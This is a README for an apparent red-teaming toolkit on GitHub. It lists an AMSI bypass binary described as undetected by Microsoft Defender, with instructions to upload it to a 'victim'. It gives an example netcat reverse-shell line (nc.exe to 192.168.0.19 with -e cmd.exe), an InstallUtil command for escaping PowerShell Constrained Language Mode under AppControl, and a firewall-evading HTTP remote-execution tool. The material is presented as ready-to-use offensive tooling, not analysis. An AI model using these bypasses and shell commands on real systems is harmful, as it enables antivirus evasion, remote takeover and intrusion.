# Some custom tools for redteaming
Tools and more... 

### AMSI
---
Golang amsi bypass, currently undetected by Microsoft Defender and possibly other AV solutions
- Usage:
  - Download [amsi.exe](https://github.com/namcuongq/security/blob/main/amsi/amsi.exe) and upload to victim
  - Run amsi.exe and enjoy it.
####
  *Note: if you want to add add parameter to program or open any exe file with bypass amsi mode, You only need put them into file with name godpay in the same directory amsi.exe. Example godpay file:*
  ```
  powershell ipconfig
  or 
  C:\Users\Public\nc.exe 192.168.0.19 8080 -e cmd.exe
  ```
  
### Bypass-CLM
---

- This will build an executable which executes a Full Language Mode powershell session. This method will provide a full powershell session just like running powershell.exe, but not powershell.
- If AppControl is enabled, you can run it with InstallUtil.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "bypass-clm.exe"
```

### Dir_Server
---
Simple directory listing in http-server like python http-simple-server. You can use it for download file.
```
dir_server [dir] [listen address]
```

### Forward_Tcp
---
Simple way to create a tunnel from special port to another. Tool like socat but usage very easy.

```
forward_tcp [src] [dst]
```

### NCC
---
Simple Remote Code Execution Tool via http or https which is normally not blocked and to the destination server, effectively bypassing the restrictions on firewall
```
ncc -l -s 10.10.3.5:443
ncc -s 10.10.3.5:443 -e
```

### SSH_Brute
---
  
